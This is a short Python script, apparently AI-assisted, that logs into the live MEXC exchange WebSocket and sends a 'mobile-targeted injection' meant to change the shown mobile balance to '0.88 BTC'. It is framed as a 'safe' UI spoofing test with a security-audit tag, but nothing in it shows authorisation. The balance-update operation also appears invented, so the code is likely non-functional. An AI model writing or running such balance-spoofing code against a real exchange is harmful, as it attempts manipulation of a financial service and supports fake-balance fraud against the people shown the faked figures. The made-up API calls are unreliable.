import asyncio
import websockets
import json
import time  # Added missing import
import hmac
import hashlib
from datetime import datetime

async def mobile_ui_test():
    """Safe mobile UI spoofing test with full error handling"""
    try:
        print("🔵 [1/4] Connecting to WebSocket...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # 1. Authentication (replace placeholders)
            timestamp = int(time.time() * 1000)
            signature = hmac.new(
                b"YOUR_API_SECRET",  # Use your actual secret
                f"timestamp={timestamp}".encode(),
                hashlib.sha256
            ).hexdigest()
            
            auth_msg = {
                "op": "auth",
                "args": ["YOUR_API_KEY", timestamp, signature]
            }
            await ws.send(json.dumps(auth_msg))
            auth_response = await ws.recv()
            print(f"🟢 [2/4] Auth response: {auth_response}")

            # 2. Mobile-targeted injection
            test_payload = {
                "op": "update",
                "args": [{
                    "target": "mobile_balance",
                    "test_value": "0.88 BTC",
                    "nonce": int(time.time() * 1000),
                    "audit_tag": f"sec_test_{datetime.now().date()}"
                }]
            }
            await ws.send(json.dumps(test_payload))
            print("🟡 [3/4] Sent mobile UI test payload")

            # 3. Monitor for 15 seconds
            print("🔵 [4/4] Monitoring for 15s (check mobile app)...")
            await asyncio.sleep(15)
            print("🟢 Test completed - review mobile app recording")

    except websockets.exceptions.ConnectionClosed:
        print("🔴 Connection closed unexpectedly")
    except Exception as e:
        print(f"🔴 Critical error: {type(e).__name__}: {str(e)}")

if __name__ == "__main__":
    asyncio.run(mobile_ui_test())
